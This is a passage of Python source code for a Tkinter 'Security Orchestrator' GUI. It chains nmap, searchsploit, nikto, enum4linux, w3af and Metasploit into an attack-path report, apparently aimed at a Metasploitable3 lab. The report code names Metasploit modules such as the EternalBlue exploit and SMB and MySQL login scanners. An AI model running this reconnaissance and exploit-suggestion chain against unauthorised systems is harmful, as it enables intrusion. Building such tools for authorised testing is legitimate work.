        success, message = self.nmap_wrapper.run_scan(nmap_command, target_ip)
        if success:
            nmap_results = self.nmap_wrapper.parse_xml_results()
            self.scan_results.add_tool_result('nmap', nmap_results or {})

        return success, message

    def _run_searchsploit_step(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute Searchsploit analysis step."""
        if not self.searchsploit_wrapper.check_availability():
            return False, "Searchsploit not available"

        nmap_xml = self.results_dir / "nmap_result.xml"
        success, message = self.searchsploit_wrapper.run_nmap_search(nmap_xml)
        if success:
            searchsploit_results = self.searchsploit_wrapper.parse_results()
            self.scan_results.add_tool_result('searchsploit', searchsploit_results)

        return success, message

    def _run_nikto_step(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute Nikto scanning step."""
        if not self.nikto_wrapper.check_availability():
            return False, "Nikto not available"

        http_ports = self.nmap_wrapper.get_http_ports()
        success, message = self.nikto_wrapper.scan_http_services(http_ports)
        if success:
            nikto_results = self.nikto_wrapper.get_scan_summary()
            self.scan_results.add_tool_result('nikto', nikto_results)

        return success, message

    def _run_enum4linux_step(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute enum4linux enumeration step."""
        if not self.enum4linux_wrapper.check_availability():
            return False, "enum4linux not available"

        target = target_ip or self.nmap_wrapper.get_target_ip()
        if not target:
            return False, "No target IP available for enum4linux"

        success, message = self.enum4linux_wrapper.run_enumeration(target)
        if success:
            enum4linux_results = self.enum4linux_wrapper.parse_results()
            self.scan_results.add_tool_result('enum4linux', enum4linux_results)

        return success, message

    def _run_w3af_step(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute w3af scanning step."""
        if not self.w3af_wrapper.check_availability():
            return False, "w3af not available"

        http_ports = self.nmap_wrapper.get_http_ports()
        success, message = self.w3af_wrapper.run_scan(http_ports)
        if success:
            w3af_results = self.w3af_wrapper.parse_results()
            self.scan_results.add_tool_result('w3af', w3af_results)

        return success, message

    def _run_metasploit_step(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute Metasploit suggestion generation step."""
        if not self.metasploit_wrapper.check_availability():
            return False, "Metasploit not available"

        nmap_results = self.scan_results.get_tool_result('nmap')
        searchsploit_results = self.scan_results.get_tool_result('searchsploit')
        enum4linux_results = self.scan_results.get_tool_result('enum4linux')

        success, message = self.metasploit_wrapper.generate_exploit_suggestions(
            nmap_results, searchsploit_results, enum4linux_results
        )

        if success:
            metasploit_results = {'suggestions_generated': True}
            self.scan_results.add_tool_result('metasploit', metasploit_results)

        return success, message

    def _generate_final_report(self) -> str:
        """Generate the comprehensive final report."""
        lines = []

        # Header
        lines.extend([
            "=" * 80,
            "FINAL ATTACK PATH REPORT",
            "Generated by Security Orchestrator",
            f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "=" * 80,
            ""
        ])

        # Target Information
        lines.extend([
            "TARGET INFORMATION",
            "-" * 20
        ])

        target_ip = self.scan_results.get_metadata('target_ip')
        nmap_command = self.scan_results.get_metadata('nmap_command')

        if target_ip:
            lines.append(f"Target IP: {target_ip}")
        if nmap_command:
            lines.append(f"Nmap Command: {nmap_command}")

        lines.append("")

        # Nmap Port Findings
        nmap_results = self.scan_results.get_tool_result('nmap')
        if nmap_results and 'hosts' in nmap_results:
            lines.extend([
                "NMAP PORT FINDINGS",
                "-" * 18
            ])

            for host in nmap_results['hosts']:
                for addr in host.get('addresses', []):
                    if addr.get('addrtype') == 'ipv4':
                        lines.append(f"Host: {addr['addr']}")
                        break

                for port in host.get('ports', []):
                    if port.get('state', {}).get('state') == 'open':
                        port_id = port.get('portid', 'N/A')
                        service_name = port.get('service', {}).get('name', 'unknown')
                        product = port.get('service', {}).get('product', '')
                        version = port.get('service', {}).get('version', '')

                        service_info = f"{service_name}"
                        if product:
                            service_info += f" {product}"
                        if version:
                            service_info += f" {version}"

                        lines.append(f"  {port_id}/tcp - {service_info}")

            lines.append("")

        # Searchsploit Vulnerabilities
        searchsploit_results = self.scan_results.get_tool_result('searchsploit')
        if searchsploit_results and 'exploits' in searchsploit_results:
            lines.extend([
                "SEARCHSPLOIT VULNERABILITIES",
                "-" * 27
            ])

            for exploit in searchsploit_results['exploits'][:20]:  # Top 20
                lines.append(f"ID: {exploit.get('id', 'N/A')}")
                lines.append(f"Title: {exploit.get('title', 'N/A')}")
                lines.append(f"Platform: {exploit.get('platform', 'N/A')}")
                if exploit.get('local_file'):
                    lines.append(f"Local File: {exploit['local_file']}")
                lines.append("")

        # Nikto Findings
        nikto_results = self.scan_results.get_tool_result('nikto')
        if nikto_results and 'top_vulnerabilities' in nikto_results:
            lines.extend([
                "NIKTO WEB VULNERABILITIES",
                "-" * 25
            ])

            for vuln in nikto_results['top_vulnerabilities'][:15]:  # Top 15
                lines.append(f"URL: {vuln.get('url', 'N/A')}")
                lines.append(f"Severity: {vuln.get('severity', 'N/A').upper()}")
                lines.append(f"Description: {vuln.get('description', 'N/A')}")
                lines.append("")

        # enum4linux Results
        enum4linux_results = self.scan_results.get_tool_result('enum4linux')
        if enum4linux_results:
            lines.extend([
                "ENUM4LINUX SMB ENUMERATION",
                "-" * 27
            ])

            if enum4linux_results.get('users'):
                lines.append(f"Users Found: {len(enum4linux_results['users'])}")
                for user in enum4linux_results['users'][:10]:  # Top 10
                    lines.append(f"  - {user.get('username', 'N/A')}")

            if enum4linux_results.get('shares'):
                lines.append(f"Shares Found: {len(enum4linux_results['shares'])}")
                for share in enum4linux_results['shares'][:10]:  # Top 10
                    lines.append(f"  - {share.get('name', 'N/A')} ({share.get('type', 'N/A')})")

            lines.append("")

        # w3af Findings
        w3af_results = self.scan_results.get_tool_result('w3af')
        if w3af_results and 'vulnerabilities' in w3af_results:
            lines.extend([
                "W3AF WEB APPLICATION FINDINGS",
                "-" * 30
            ])

            for vuln in w3af_results['vulnerabilities'][:10]:  # Top 10
                lines.append(f"Type: {vuln.get('type', 'N/A')}")
                lines.append(f"Severity: {vuln.get('severity', 'N/A').upper()}")
                lines.append(f"Description: {vuln.get('description', 'N/A')}")
                lines.append("")

        # Metasploit Suggestions
        metasploit_results = self.scan_results.get_tool_result('metasploit')
        if metasploit_results and metasploit_results.get('suggestions_generated'):
            lines.extend([
                "METASPLOIT EXPLOIT SUGGESTIONS",
                "-" * 32
            ])

            metasploit_file = self.results_dir / "metasploit_suggestions.txt"
            if metasploit_file.exists():
                lines.append(f"See detailed suggestions in: {metasploit_file}")
                lines.append("")
                lines.append("Key Metasploit modules for this target:")
                lines.append("- EternalBlue (MS17-010): exploit/windows/smb/ms17_010_eternalblue")
                lines.append("- SMB Login Scanner: auxiliary/scanner/smb/smb_login")
                lines.append("- MySQL Login: auxiliary/scanner/mysql/mysql_login")
                lines.append("")
            else:
                lines.append("Metasploit suggestions generated but file not found.")
                lines.append("")

        # Artifacts
        lines.extend([
            "ARTIFACTS GENERATED",
            "-" * 19,
            f"results/nmap_result.xml - Nmap XML output",
            f"results/searchsploit.txt - Exploit database search results",
            f"results/nikto_*.xml - Nikto scan results per service",
            f"results/nikto_summary.txt - Nikto findings summary",
            f"results/enum4linux.txt - SMB enumeration results",
            f"results/w3af_script.w3af - w3af scan script",
            f"results/w3af_report.txt - w3af scan output",
            f"results/metasploit_suggestions.txt - Metasploit exploit suggestions",
            f"results/final_report.txt - This report",
            f"results/scan.log - Detailed execution log",
            "",
            "=" * 80,
            "END OF REPORT",
            "=" * 80
        ])

        return "\n".join(lines)

# =============================================================================
# GUI INTERFACE
# =============================================================================

class SecurityOrchestratorGUI:
    """Main GUI application for Security Orchestrator."""

    def __init__(self, root):
        self.root = root
        self.root.title(config.get('app.window_title'))
        self.root.geometry(f"{config.get('app.window_width')}x{config.get('app.window_height')}")

        # Initialize orchestrator
        self.orchestrator = Orchestrator()
        self.scan_thread = None
        self.scan_running = False

        # Create GUI elements
        self._create_widgets()

        # Check tool availability
        self._check_tools()

    def _create_widgets(self):
        """Create all GUI widgets."""
        # Main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(4, weight=1)

        # Title
        title_label = ttk.Label(main_frame, text="Security Orchestrator",
                               font=("Arial", 16, "bold"))
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 10))

        # Nmap Command Input
        ttk.Label(main_frame, text="Nmap Command:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.nmap_text = tk.Text(main_frame, height=3, width=80, wrap=tk.WORD)
        self.nmap_text.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=2)
        self.nmap_text.insert(tk.END, "nmap -sV -p 1-1000 192.168.1.100")

        # Target IP Input with presets
        target_frame = ttk.Frame(main_frame)
        target_frame.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=2)

        ttk.Label(target_frame, text="Target IP/Range (optional):").grid(row=0, column=0, sticky=tk.W)
        self.target_entry = ttk.Entry(target_frame, width=30)
        self.target_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(5, 0))

        ttk.Label(target_frame, text="Quick Presets:").grid(row=0, column=2, sticky=tk.W, padx=(10, 0))
        self.preset_var = tk.StringVar()
        self.preset_combo = ttk.Combobox(target_frame, textvariable=self.preset_var,
                                        values=["", "Metasploitable3 (192.168.1.100)", "Localhost (127.0.0.1)", "Custom"],
                                        state="readonly", width=25)
        self.preset_combo.grid(row=0, column=3, sticky=tk.W, padx=(5, 0))
        self.preset_combo.bind("<<ComboboxSelected>>", self._on_preset_selected)

        # Output Directory
        ttk.Label(main_frame, text="Output Directory:").grid(row=4, column=0, sticky=tk.W, pady=2)
        self.output_frame = ttk.Frame(main_frame)
        self.output_frame.grid(row=4, column=1, columnspan=2, sticky=(tk.W, tk.E), pady=2)
        self.output_entry = ttk.Entry(self.output_frame, width=40)
        self.output_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.output_entry.insert(0, "results")
        ttk.Button(self.output_frame, text="Browse", command=self._browse_output_dir).pack(side=tk.RIGHT, padx=(5, 0))

        # Control Buttons
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=5, column=0, columnspan=3, pady=10)

        self.scan_button = ttk.Button(button_frame, text="Run Comprehensive Scan",
                                    command=self._start_scan, state=tk.DISABLED)
        self.scan_button.pack(side=tk.LEFT, padx=(0, 10))

        self.export_button = ttk.Button(button_frame, text="Export Report",
                                      command=self._export_report, state=tk.DISABLED)
        self.export_button.pack(side=tk.LEFT)

        # Progress and Status
        ttk.Label(main_frame, text="Status:").grid(row=6, column=0, sticky=tk.W, pady=2)
        self.status_label = ttk.Label(main_frame, text="Ready", foreground="blue")
        self.status_label.grid(row=6, column=1, sticky=tk.W, pady=2)

        self.progress = ttk.Progressbar(main_frame, orient="horizontal", length=400, mode="determinate")
        self.progress.grid(row=6, column=2, sticky=(tk.W, tk.E), pady=2)

        # Output Console
        ttk.Label(main_frame, text="Output Console:").grid(row=7, column=0, sticky=tk.W, pady=2)
        self.output_text = scrolledtext.ScrolledText(main_frame, height=20, width=80, wrap=tk.WORD)
        self.output_text.grid(row=8, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), pady=2)

        # Tool status frame
        tools_frame = ttk.LabelFrame(main_frame, text="Tool Availability", padding="5")
        tools_frame.grid(row=9, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=10)

        self.tool_labels = {}
        tools = ['nmap', 'searchsploit', 'nikto', 'enum4linux', 'w3af_console', 'msfconsole']
        for i, tool in enumerate(tools):
            ttk.Label(tools_frame, text=f"{tool.replace('_', ' ').title()}:").grid(row=0, column=i*2, sticky=tk.W, padx=5)
            self.tool_labels[tool] = ttk.Label(tools_frame, text="Checking...", foreground="orange")
            self.tool_labels[tool].grid(row=0, column=i*2+1, sticky=tk.W, padx=5)

    def _check_tools(self):
        """Check availability of all security tools."""
        def check_tool(tool_name):
            wrapper_map = {
                'nmap': self.orchestrator.nmap_wrapper,
                'searchsploit': self.orchestrator.searchsploit_wrapper,
                'nikto': self.orchestrator.nikto_wrapper,
                'enum4linux': self.orchestrator.enum4linux_wrapper,
                'w3af_console': self.orchestrator.w3af_wrapper,
                'msfconsole': self.orchestrator.metasploit_wrapper
            }

            if tool_name in wrapper_map:
                available = wrapper_map[tool_name].check_availability()
                status = "✓ Available" if available else "✗ Not Found"
                color = "green" if available else "red"

                self.root.after(0, lambda: self._update_tool_status(tool_name, status, color))

        # Check tools in background
        for tool in ['nmap', 'searchsploit', 'nikto', 'enum4linux', 'w3af_console', 'msfconsole']:
            thread = threading.Thread(target=check_tool, args=(tool,), daemon=True)
            thread.start()

    def _update_tool_status(self, tool_name, status, color):
        """Update tool availability status in GUI."""
        if tool_name in self.tool_labels:
            self.tool_labels[tool_name].config(text=status, foreground=color)

        # Enable scan button if nmap is available (minimum requirement)
        if tool_name == 'nmap' and status == "✓ Available":
            self.scan_button.config(state=tk.NORMAL)

    def _on_preset_selected(self, event):
        """Handle preset selection."""
        preset = self.preset_var.get()
        if preset == "Metasploitable3 (192.168.1.100)":
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, "192.168.1.100")
            self.nmap_text.delete("1.0", tk.END)
            self.nmap_text.insert(tk.END, "nmap -sV -p 1-1000,3306,3389,445,80,443,8080 --script vuln 192.168.1.100")
        elif preset == "Localhost (127.0.0.1)":
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, "127.0.0.1")
            self.nmap_text.delete("1.0", tk.END)
            self.nmap_text.insert(tk.END, "nmap -sV -p 1-1000 127.0.0.1")
        elif preset == "Custom":
            self.target_entry.delete(0, tk.END)
            self.nmap_text.delete("1.0", tk.END)
            self.nmap_text.insert(tk.END, "nmap -sV -p 1-1000 ")

    def _browse_output_dir(self):
        """Browse for output directory."""
        dir_path = filedialog.askdirectory(initialdir=self.output_entry.get())
        if dir_path:
            self.output_entry.delete(0, tk.END)
            self.output_entry.insert(0, dir_path)

    def _start_scan(self):
        """Start the comprehensive security scan."""
        if self.scan_running:
            return

        nmap_command = self.nmap_text.get("1.0", tk.END).strip()
        if not nmap_command:
            messagebox.showerror("Error", "Please enter an Nmap command")
            return

        target_ip = self.target_entry.get().strip() or None
        output_dir = self.output_entry.get().strip()

        # Update orchestrator with new output directory
        self.orchestrator = Orchestrator(Path(output_dir))

        # Clear output console
        self.output_text.delete("1.0", tk.END)

        # Update UI
        self.scan_button.config(state=tk.DISABLED)
        self.progress['value'] = 0
        self.status_label.config(text="Starting scan...", foreground="blue")

        # Start scan in background thread
        self.scan_running = True
        self.scan_thread = threading.Thread(target=self._run_scan_worker,
                                          args=(nmap_command, target_ip),
                                          daemon=True)
        self.scan_thread.start()

    def _run_scan_worker(self, nmap_command, target_ip):
        """Worker function to run the scan in background."""
        try:
            def progress_callback(message):
                self.root.after(0, lambda: self._update_progress(message))

            success, message = self.orchestrator.run_comprehensive_scan(
                nmap_command, target_ip, progress_callback
            )

            self.root.after(0, lambda: self._scan_completed(success, message))

        except Exception as e:
            self.root.after(0, lambda: self._scan_completed(False, f"Scan error: {str(e)}"))

    def _update_progress(self, message):
        """Update progress display."""
        self.output_text.insert(tk.END, f"{datetime.now().strftime('%H:%M:%S')} - {message}\n")
        self.output_text.see(tk.END)
        self.status_label.config(text=message, foreground="blue")

        # Update progress bar based on message content
        if "Starting" in message:
            self.progress['value'] = 10
        elif "Nmap" in message and "completed" in message:
            self.progress['value'] = 20
        elif "Exploit Database" in message and "completed" in message:
            self.progress['value'] = 35
        elif "Web Vulnerability" in message and "completed" in message:
            self.progress['value'] = 50
        elif "SMB Enumeration" in message and "completed" in message:
            self.progress['value'] = 70
        elif "Web Application" in message and "completed" in message:
            self.progress['value'] = 85
        elif "Metasploit" in message and "completed" in message:
            self.progress['value'] = 100

    def _scan_completed(self, success, message):
        """Handle scan completion."""
        self.scan_running = False
        self.scan_button.config(state=tk.NORMAL)
        self.export_button.config(state=tk.NORMAL)

        color = "green" if success else "red"
        self.status_label.config(text="Scan completed", foreground=color)
        self.progress['value'] = 100

        self.output_text.insert(tk.END, f"\n{'='*50}\n")
        self.output_text.insert(tk.END, f"SCAN RESULT: {'SUCCESS' if success else 'FAILED'}\n")
        self.output_text.insert(tk.END, f"{message}\n")
        self.output_text.insert(tk.END, f"{'='*50}\n")
        self.output_text.see(tk.END)

        # Display final report in console
        report_file = self.orchestrator.results_dir / "final_report.txt"
        if report_file.exists():
            try:
                with open(report_file, 'r', encoding='utf-8') as f:
                    report_content = f.read()
                self.output_text.insert(tk.END, f"\n{'='*80}\nFINAL REPORT:\n{'='*80}\n")
                self.output_text.insert(tk.END, report_content)
                self.output_text.see(tk.END)
            except Exception as e:
                self.output_text.insert(tk.END, f"Error loading report: {e}\n")

    def _export_report(self):
        """Export the final report to a user-selected location."""
        report_file = self.orchestrator.results_dir / "final_report.txt"
        if not report_file.exists():
            messagebox.showerror("Error", "No report available to export")
            return

        save_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile="final_attack_path_report.txt"
        )

        if save_path:
            try:
                import shutil
                shutil.copy2(report_file, save_path)
                messagebox.showinfo("Success", f"Report exported to {save_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export report: {e}")

# =============================================================================
# MAIN APPLICATION
# =============================================================================

def main():
    """Main application entry point."""
    root = tk.Tk()
    app = SecurityOrchestratorGUI(root)

    # Set window icon if available
    try:
        root.iconbitmap()  # Use default
    except:
        pass

    root.mainloop()

if __name__ == "__main__":
    main()